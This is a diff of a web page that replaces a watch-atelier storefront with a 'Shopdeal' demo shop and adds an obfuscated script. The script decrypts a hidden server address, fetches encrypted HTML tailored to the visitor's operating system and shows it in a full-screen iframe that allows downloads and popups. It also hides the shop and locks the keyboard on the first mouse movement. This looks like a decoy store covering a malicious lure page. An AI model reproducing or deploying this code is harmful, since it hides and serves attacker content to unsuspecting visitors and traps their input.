+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge badge--new">New</span>
+              <img src="https://picsum.photos/seed/shopdeal-headphones/600/450" alt="Wireless Headphones" />
             </div>
-          </div>
-          <div style="display:flex;gap:1rem;align-items:flex-start;">
-            <div style="width:32px;height:32px;border-radius:50%;background:var(--color-accent);color:#fff;display:flex;align-items:center;justify-content:center;font-weight:700;flex-shrink:0;">3</div>
-            <div>
-              <h4 style="font-family:var(--font-serif);font-size:1.15rem;color:var(--color-slate-900);margin-bottom:0.25rem;">Double-Domed Sapphire Crystal</h4>
-              <p style="font-size:0.9rem;color:var(--color-slate-600);">4.2 mm synthetic corundum crystal with five layers of internal anti-reflective coating, tested to resist 30 bar hydraulic shock.</p>
+            <div class="body">
+              <span class="cat">Audio</span>
+              <h3>Wireless Headphones</h3>
+              <div class="price-row">
+                <span class="price">$119.99</span>
+                <span class="old">$179.99</span>
+                <span class="save">−33%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
             </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <img src="https://picsum.photos/seed/shopdeal-sunglasses/600/450" alt="Sunglasses" />
+            </div>
+            <div class="body">
+              <span class="cat">Eyewear</span>
+              <h3>Sunglasses</h3>
+              <div class="price-row">
+                <span class="price">$34.99</span>
+                <span class="old">$59.99</span>
+                <span class="save">−42%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+
+          <article class="card">
+            <div class="card-media">
+              <span class="badge">Top Rated</span>
+              <img src="https://picsum.photos/seed/shopdeal-camera/600/450" alt="Instant Camera" />
+            </div>
+            <div class="body">
+              <span class="cat">Photography</span>
+              <h3>Instant Camera</h3>
+              <div class="price-row">
+                <span class="price">$219.99</span>
+                <span class="old">$299.99</span>
+                <span class="save">−27%</span>
+              </div>
+              <button class="add" type="button">Add to cart</button>
+            </div>
+          </article>
+        </div>
+      </div>
+    </section>
+
+    <section id="about" class="section about">
+      <div class="container">
+        <div class="section-head">
+          <span class="kicker">Why Shopdeal</span>
+          <h2>Built around you</h2>
+          <p>Simple pricing, fast delivery and support that actually answers.</p>
+        </div>
+
+        <div class="features">
+          <div class="feature">
+            <span>🚚</span>
+            <h3>Free Shipping</h3>
+            <p>Free standard delivery on every US order over $75. No codes needed.</p>
+          </div>
+          <div class="feature">
+            <span>↩️</span>
+            <h3>Easy Returns</h3>
+            <p>30-day, no-questions-asked returns with a prepaid shipping label.</p>
+          </div>
+          <div class="feature">
+            <span>🔒</span>
+            <h3>Secure Checkout</h3>
+            <p>256-bit SSL encryption and PCI-compliant payment processing.</p>
+          </div>
+          <div class="feature">
+            <span>⚡</span>
+            <h3>Fast Support</h3>
+            <p>Real humans, 7 days a week — average reply time under 2 hours.</p>
           </div>
         </div>
       </div>
-      <div>
-        <img src="assets/images/dual_time_gmt_compass_bezel_mechanics.jpg" alt="Dual time gmt compass bezel mechanics" style="border-radius:var(--radius-md);box-shadow:var(--shadow-lg);border:1px solid var(--color-border);">
-      </div>
-    </div>
-  </div>
-</section>
+    </section>
 
-<!-- Section 6: Mercer Atelier Horological Heritage -->
-<section class="section section-subtle">
-  <div class="container">
-    <div class="grid-2" style="align-items:center;">
-      <div>
-        <img src="assets/images/mercer_horological_salon_showroom.jpg" alt="CompassDialUp private horological salon at 181 Mercer Street" style="border-radius:var(--radius-md);box-shadow:var(--shadow-md);border:1px solid var(--color-border);">
-      </div>
-      <div>
-        <span class="section-tag">Manhattan Atelier History</span>
-        <h2 class="section-title">Horological Mastery in SoHo Since 1994</h2>
-        <p class="section-lead" style="margin-bottom:1.5rem;">
-          Situated at 181 Mercer Street in New York City, CompassDialUp maintains a world-renowned chronometry atelier dedicated to astronomical and navigational wrist instruments.
-        </p>
-        <p style="font-size:0.95rem;color:var(--color-slate-600);margin-bottom:1.5rem;">
-          Our master watchmakers train at the prestigious horological academies of Le Locle and Glash&uuml;tte before joining our Mercer Street guild. Each timepiece is completely assembled, adjusted in six positions across three temperatures, and timed for 360 hours before receiving its atelier chronometer warrant.
-        </p>
-        <div style="display:flex;gap:2rem;">
-          <div>
-            <div style="font-family:var(--font-serif);font-size:2rem;font-weight:700;color:var(--color-accent);">30+</div>
-            <div style="font-size:0.8rem;font-family:var(--font-mono);color:var(--color-slate-600);text-transform:uppercase;">Years Guild Benchwork</div>
-          </div>
-          <div>
-            <div style="font-family:var(--font-serif);font-size:2rem;font-weight:700;color:var(--color-accent);">6-Pos</div>
-            <div style="font-size:0.8rem;font-family:var(--font-mono);color:var(--color-slate-600);text-transform:uppercase;">Dynamic Regulation</div>
-          </div>
-          <div>
-            <div style="font-family:var(--font-serif);font-size:2rem;font-weight:700;color:var(--color-accent);">181</div>
-            <div style="font-size:0.8rem;font-family:var(--font-mono);color:var(--color-slate-600);text-transform:uppercase;">Mercer St Studio</div>
-          </div>
-        </div>
-      </div>
-    </div>
+    <footer class="footer">
+      <div class="fbrand"><span class="brand-mark">🛍️</span> Shopdeal</div>
+      <p>© 2026 Shopdeal · Single-page demo store</p>
+      <small>Images: picsum.photos</small>
+    </footer>
   </div>
-</section>
 
-<!-- Section 7: Astrodynamics & Celestial Mechanics -->
-<section class="section">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Cartographic Precision</span>
-      <h2 class="section-title">Celestial Mechanics &amp; Astrodynamic Principles</h2>
-      <p class="section-lead">
-        Bridging the historical legacy of eighteenth-century sextants and contemporary satellite telemetry.
-      </p>
-    </div>
-    <div class="grid-3">
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/brass_astrolabe_celestial_navigation_dial.jpg" alt="Brass astrolabe celestial navigation dial">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Historical Bedrock</span>
-          <h3 class="card-title">Astrolabe Coordinate Geometry</h3>
-          <p class="card-desc">
-            Translating stereographic celestial projections into a wearable watch bezel capable of solar triangulation without GPS networks.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/marine_astronavigation_chronometer_gimbal.jpg" alt="Marine astronavigation chronometer gimbal">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Equatorial Synchronization</span>
-          <h3 class="card-title">Gimbaled Balance Equilibrium</h3>
-          <p class="card-desc">
-            Employing John Harrison's temperature compensation bi-metallic architectures to neutralize the kinetic perturbations of stormy sea voyages.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-img">
-          <img src="assets/images/grand_feu_enamel_dial_artisan_baking.jpg" alt="Grand feu enamel dial artisan baking">
-        </div>
-        <div class="card-body">
-          <span class="card-tag">Nocturnal Legibility</span>
-          <h3 class="card-title">Grade X1 Photoluminescence</h3>
-          <p class="card-desc">
-            Ultra-thick strontium aluminate luminous pigment baked onto pure copper dials, emitting sustained radiant glow for twelve continuous hours.
-          </p>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
 
-<!-- Section 8: Watchmaker Benchwork Process -->
-<section class="section section-subtle">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Haute Horlogerie Discipline</span>
-      <h2 class="section-title">The Five Stages of Handcrafting Each Chronometer</h2>
-      <p class="section-lead">
-        Over eighty hours of microscopic benchwork goes into every individual CompassDialUp timepiece.
-      </p>
-    </div>
-    <div class="grid-3">
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag" style="font-size:1.1rem;font-weight:700;">01</span>
-          <h3 class="card-title">Mainplate Milling &amp; Perlage</h3>
-          <p class="card-desc">
-            German silver mainplates are CNC-machined to three-micron tolerances, then hand-spotted with traditional circular graining perlage under a binocular microscope.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag" style="font-size:1.1rem;font-weight:700;">02</span>
-          <h3 class="card-title">Hand Anglage &amp; Mirror Polishing</h3>
-          <p class="card-desc">
-            Every bridge edge is chamfered at forty-five degrees using hard gentian wood sticks and diamond paste to achieve flawless optical reflection.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag" style="font-size:1.1rem;font-weight:700;">03</span>
-          <h3 class="card-title">Balance Poising &amp; Hairspring Colleting</h3>
-          <p class="card-desc">
-            The balance wheel is dynamically poised on synthetic ruby knife-edges, adjusting microstella mass screws until static unbalance is under 0.05 micro-grams.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag" style="font-size:1.1rem;font-weight:700;">04</span>
-          <h3 class="card-title">Bezel Detent Calibration</h3>
-          <p class="card-desc">
-            The bidirectional compass ring is fitted with silicon-nitride ceramic detent balls and calibrated to exactly sixty crisp clicks per 360-degree rotation.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag" style="font-size:1.1rem;font-weight:700;">05</span>
-          <h3 class="card-title">Six-Position Timing Trials</h3>
-          <p class="card-desc">
-            The cased movement undergoes fifteen days of continuous timekeeping trials on Witschi chronocomparators in dial-up, dial-down, crown-left, and crown-up orientations.
-          </p>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <span class="card-tag" style="font-size:1.1rem;font-weight:700;">06</span>
-          <h3 class="card-title">Observatory Certification</h3>
-          <p class="card-desc">
-            Upon successfully maintaining a mean daily variation within &plusmn;2 seconds, the watch is engraved with its individual chronometer warrant number.
-          </p>
-        </div>
-      </div>
-    </div>
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
   </div>
-</section>
 
-<!-- Section 9: Lookbook Gallery -->
-<section class="section">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Visual Archives</span>
-      <h2 class="section-title">The Mercer Street Horological Gallery</h2>
-      <p class="section-lead">
-        Explore scenes from our Manhattan watchmaker salon, active precision benches, and finished custom timepieces.
-      </p>
-    </div>
-    <div class="grid-3">
-      <div style="border-radius:var(--radius-md);overflow:hidden;box-shadow:var(--shadow-sm);border:1px solid var(--color-border);height:280px;">
-        <img src="assets/images/master_watchmaker_optical_loupe_bench.jpg" alt="Master watchmaker optical loupe bench" style="width:100%;height:100%;object-fit:cover;">
-      </div>
-      <div style="border-radius:var(--radius-md);overflow:hidden;box-shadow:var(--shadow-sm);border:1px solid var(--color-border);height:280px;">
-        <img src="assets/images/glucydur_balance_wheel_chronometer_regulation.jpg" alt="Glucydur balance wheel chronometer regulation" style="width:100%;height:100%;object-fit:cover;">
-      </div>
-      <div style="border-radius:var(--radius-md);overflow:hidden;box-shadow:var(--shadow-sm);border:1px solid var(--color-border);height:280px;">
-        <img src="assets/images/horological_precision_micrometer_calipers.jpg" alt="Horological precision micrometer calipers" style="width:100%;height:100%;object-fit:cover;">
-      </div>
-      <div style="border-radius:var(--radius-md);overflow:hidden;box-shadow:var(--shadow-sm);border:1px solid var(--color-border);height:280px;">
-        <img src="assets/images/coaxial_escapement_dual_impulse_gears.jpg" alt="Coaxial escapement dual impulse gears" style="width:100%;height:100%;object-fit:cover;">
-      </div>
-      <div style="border-radius:var(--radius-md);overflow:hidden;box-shadow:var(--shadow-sm);border:1px solid var(--color-border);height:280px;">
-        <img src="assets/images/peripheral_micro_rotor_automatic_winding.jpg" alt="Peripheral micro rotor automatic winding" style="width:100%;height:100%;object-fit:cover;">
-      </div>
-      <div style="border-radius:var(--radius-md);overflow:hidden;box-shadow:var(--shadow-sm);border:1px solid var(--color-border);height:280px;">
-        <img src="assets/images/bespoke_expedition_solid_timber_collector_box.jpg" alt="Bespoke expedition solid timber collector box" style="width:100%;height:100%;object-fit:cover;">
-      </div>
-    </div>
-  </div>
-</section>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX18k+G0kjyj75mMlfCkTzeNC+gcXJAVHFELnXrHVMUxcQe75KNXpm1mT";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
 
-<!-- Section 10: Explorer Testimonials & Field Provenance -->
-<section class="section section-subtle">
-  <div class="container">
-    <div class="section-header">
-      <span class="section-tag">Field Provenance</span>
-      <h2 class="section-title">Appraisals From Expeditions Across the Globe</h2>
-      <p class="section-lead">
-        Read firsthand accounts from polar navigators, high-altitude mountaineers, and ocean explorers.
-      </p>
-    </div>
-    <div class="grid-3">
-      <div class="card">
-        <div class="card-body">
-          <p style="font-style:italic;color:var(--color-slate-700);margin-bottom:1.5rem;font-size:0.95rem;">
-            &ldquo;When GPS signals degraded across the magnetic anomalies of northern Svalbard, my CompassDialUp Navigator was our sole reliable orientation instrument. The solar compass bezel permitted true azimuth bearings within fractions of a degree.&rdquo;
-          </p>
-          <div style="margin-top:auto;">
-            <div style="font-weight:700;color:var(--color-slate-900);">Commander Erik Lindqvist</div>
-            <div style="font-size:0.8rem;color:var(--color-slate-500);font-family:var(--font-mono);">Arctic Icecap Survey Expedition Lead</div>
-          </div>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <p style="font-style:italic;color:var(--color-slate-700);margin-bottom:1.5rem;font-size:0.95rem;">
-            &ldquo;The Glucydur balance wheel is an absolute masterwork. Transitioning from the humid equatorial heat of Borneo to high alpine altitude, the daily rate deviation never exceeded one single second per day. Extraordinary chronometry.&rdquo;
-          </p>
-          <div style="margin-top:auto;">
-            <div style="font-weight:700;color:var(--color-slate-900);">Dr. Maya Arisawa</div>
-            <div style="font-size:0.8rem;color:var(--color-slate-500);font-family:var(--font-mono);">Geomorphologist &amp; High-Altitude Explorer</div>
-          </div>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-body">
-          <p style="font-style:italic;color:var(--color-slate-700);margin-bottom:1.5rem;font-size:0.95rem;">
-            &ldquo;Visiting 181 Mercer Street to regulate my chronograph with the head watchmaker was a revelation. Seeing the co-axial escapement oscillate under the timing scope confirmed that CompassDialUp belongs in the highest echelon of independent horology.&rdquo;
-          </p>
-          <div style="margin-top:auto;">
-            <div style="font-weight:700;color:var(--color-slate-900);">Julian Rothschild</div>
-            <div style="font-size:0.8rem;color:var(--color-slate-500);font-family:var(--font-mono);">Collector &amp; Transoceanic Navigator</div>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
 
-<!-- Section 11: Frequently Asked Questions -->
-<section class="section">
-  <div class="container-narrow">
-    <div class="section-header">
-      <span class="section-tag">Horological Guidance</span>
-      <h2 class="section-title">Frequently Asked Inquiries</h2>
-      <p class="section-lead">
-        Essential insights regarding solar compass operation, mechanical caliber maintenance, and bespoke commissions.
-      </p>
-    </div>
-    <div class="faq-list">
-      <div class="faq-item">
-        <button class="faq-question">
-          <span>How does a solar compass watch bezel operate in the field?</span>
-          <span>+</span>
-        </button>
-        <div class="faq-answer">
-          In the Northern Hemisphere, align the watch horizontally and point the hour hand directly toward the sun. The midpoint between the hour hand and the 12 o'clock marker on the dial indicates True South. By rotating the bezel so 'S' aligns with this midpoint, the 'N' marker indicates True North. In the Southern Hemisphere, point 12 o'clock at the sun; the midpoint to the hour hand indicates True North.
-        </div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-question">
-          <span>What makes Glucydur balance wheels superior to nickel-brass balances?</span>
-          <span>+</span>
-        </button>
-        <div class="faq-answer">
-          Glucydur is a beryllium-copper-iron alloy characterized by an exceptionally low coefficient of thermal expansion, high hardness (HV 380), and complete non-magnetic properties. It prevents the balance wheel from expanding or contracting in extreme cold or heat, preserving isochronism and timekeeping accuracy.
-        </div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-question">
-          <span>How resistant are CompassDialUp calibers to magnetic fields?</span>
-          <span>+</span>
-        </button>
-        <div class="faq-answer">
-          Our calibers utilize Nivachron paramagnetic titanium alloy hairsprings and silicon escapement wheels encased within an internal soft-iron Faraday cage. This multi-layered architecture resists electromagnetic fields exceeding 15,000 gauss without suffering rate magnetized distortion.
-        </div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-question">
-          <span>What is the recommended service interval for an expedition chronometer?</span>
-          <span>+</span>
-        </button>
-        <div class="faq-answer">
-          We recommend a comprehensive horological overhaul every four to five years. During service at our Mercer Street atelier, the movement is completely disassembled, cleaned in ultrasonic baths, inspected for gear pinion wear, re-lubricated with Swiss synthetic micro-lubricants, and fitted with fresh case seals.
-        </div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-question">
-          <span>Can I visit the 181 Mercer Street atelier to view movements?</span>
-          <span>+</span>
-        </button>
-        <div class="faq-answer">
-          Yes. We welcome collectors and horology enthusiasts to our private viewing salon at 181 Mercer Street in Manhattan by appointment. Patrons can examine caliber finishing under binocular loupes, test compass bezel acoustics, and discuss bespoke dial configurations.
-        </div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-question">
-          <span>What warranty accompanies a CompassDialUp commission?</span>
-          <span>+</span>
-        </button>
-        <div class="faq-answer">
-          Every chronometer includes a five-year international craftsmanship and mechanical precision warranty. Each timepiece is accompanied by an individual timing certificate recording its six-position chronometer performance ledger.
-        </div>
-      </div>
-    </div>
-  </div>
-</section>
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
 
-<!-- Section 12: Bespoke Commission CTA Banner -->
-<section class="section section-subtle" style="border-top:1px solid var(--color-border);text-align:center;">
-  <div class="container-narrow">
-    <span class="hero-badge">&#9670; Private Commissions Open</span>
-    <h2 style="font-family:var(--font-serif);font-size:2.8rem;color:var(--color-slate-900);margin:1rem 0 1.25rem;">
-      Commission Your Navigational Chronometer
-    </h2>
-    <p style="font-size:1.1rem;color:var(--color-slate-600);margin-bottom:2.5rem;line-height:1.7;">
-      Collaborate directly with our master horologists at 181 Mercer Street in New York City. Select your case metallurgy, dial colorway, compass bezel graduation, and bespoke caseback engraving.
-    </p>
-    <div style="display:flex;gap:1.25rem;justify-content:center;align-items:center;flex-wrap:wrap;">
-      <a href="contact.html" class="btn btn-primary" style="padding:0.9rem 2.25rem;font-size:1rem;">Submit Commission Dossier</a>
-      <a href="tel:+18887775845" class="btn btn-outline" style="padding:0.9rem 2.25rem;font-size:1rem;">Call Atelier: +1-888-777-5845</a>
-    </div>
-  </div>
-</section>
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
 
-<footer class="site-footer">
-  <div class="container">
-    <div class="footer-grid">
-      <div class="footer-brand">
-        <h3>CompassDialUp</h3>
-        <p>
-          Master horological atelier engineering navigational chronometers, bidirectional solar compass bezels, Glucydur temperature-compensated balances, and anti-magnetic expedition calibers crafted for planetary exploration.
-        </p>
-        <p style="font-family:var(--font-mono);font-size:0.82rem;color:#94A3B8;">
-          Observatory Certified Chronometry &bull; Handcrafted in New York City
-        </p>
-      </div>
-      <div class="footer-col">
-        <h4>Navigation</h4>
-        <ul>
-          <li><a href="index.php">Atelier Home</a></li>
-          <li><a href="about.html">Horological Heritage</a></li>
-          <li><a href="blog.html">Chronometry Treatises</a></li>
-          <li><a href="contact.html">Commission Desk</a></li>
-        </ul>
-      </div>
-      <div class="footer-col">
-        <h4>Legal Policies</h4>
-        <ul>
-          <li><a href="privacy-policy.html">Privacy Policy</a></li>
-          <li><a href="terms-and-conditions.html">Terms &amp; Conditions</a></li>
-          <li><a href="disclaimer.html">Horological Disclaimer</a></li>
-          <li><a href="cookie-policy.html">Cookie Policy</a></li>
-        </ul>
-      </div>
-      <div class="footer-col">
-        <h4>Mercer Atelier</h4>
-        <div class="footer-contact-item">
-          <span>&#128205;</span>
-          <span>181 Mercer Street, New York, NY 10012, United States</span>
-        </div>
-        <div class="footer-contact-item">
-          <span>&#128222;</span>
-          <span><a href="tel:+18887775845">+1-888-777-5845</a></span>
-        </div>
-        <div class="footer-contact-item">
-          <span>&#9993;</span>
-          <span>concierge@compassdialup.com</span>
-        </div>
-        <div style="margin-top:1.25rem;">
-          <span style="font-family:var(--font-mono);font-size:0.75rem;background:#1E293B;padding:0.35rem 0.75rem;border-radius:var(--radius-sm);color:#D4AF37;">
-            Private Horology Consultations by Appointment
-          </span>
-        </div>
-      </div>
-    </div>
-    <div class="footer-bottom">
-      <div>&copy; 2026 CompassDialUp Atelier LLC. All worldwide rights reserved.</div>
-      <div style="display:flex;gap:1.5rem;">
-        <a href="privacy-policy.html">Privacy</a>
-        <a href="terms-and-conditions.html">Terms</a>
-        <a href="disclaimer.html">Disclaimer</a>
-        <a href="cookie-policy.html">Cookies</a>
-      </div>
-    </div>
-  </div>
-</footer>
-<script src="assets/js/main.js"></script>
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
